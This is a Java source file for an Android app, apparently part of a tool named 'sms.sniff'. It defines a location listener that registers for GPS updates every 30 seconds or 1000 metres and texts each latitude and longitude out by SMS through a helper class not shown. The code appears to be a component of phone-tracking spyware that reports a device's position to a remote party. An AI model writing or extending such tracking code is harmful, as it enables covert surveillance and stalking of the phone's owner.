package sms.sniff.location;

import sms.sniff.utils.SMS;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;

public class LocationUpdater implements LocationListener{

	private LocationManager manager;

	public LocationUpdater(Context context) {
		
		manager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
		manager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000, 1000, this);
		
		new SMS(".").sendConfirmation();
	}
	
	public void unregister() {
		manager.removeUpdates(this);
	}

	@Override
	public void onLocationChanged(Location location) {
		double latitude = location.getLatitude();
		double longitude = location.getLongitude();

		new SMS(latitude + " " + longitude).sendConfirmation();
	}

	@Override
	public void onProviderDisabled(String provider) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onProviderEnabled(String provider) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
		// TODO Auto-generated method stub
		
	}
}
